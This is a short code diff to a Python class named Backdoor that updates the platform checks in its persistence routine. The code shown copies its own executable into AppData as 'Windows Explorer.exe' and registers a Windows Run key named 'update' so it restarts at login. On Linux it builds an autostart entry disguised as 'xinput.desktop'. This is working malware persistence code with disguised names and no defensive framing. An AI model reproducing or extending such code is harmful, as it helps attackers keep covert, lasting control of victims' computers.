@@ -23,15 +23,15 @@ class Backdoor:
         """
         Rather poor persistence method. Need to update.
         """
-        if (platform == "win32" or platform == "cygwin"):
+        if (sys.platform.startswith("win32") or sys.platform.startswith("cygwin")):
             # Windows or __file__ DO NOT PERSIST IF EMBEDDED INSIDE OF ANOTHER FILE 
             location = os.environ["appdata"] + "\\Windows Explorer.exe"
             if (not os.path.exists(location)):
                 shutil.copyfile(sys.executable, location)
                 subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',shell=True)
-        if (platform == "darwin"):
+        if (sys.platform.startswith("darwin")):
             pass
-        if (platform == "linux" or platform == "linux2"):
+        if (sys.platform.startswith("linux")):
             home_config_dir = os.path.expanduser('~') + "/.config/"
             autostart_path = home_config_dir + "/autostart/"
             autostart_file = autostart_path + "xinput.desktop"
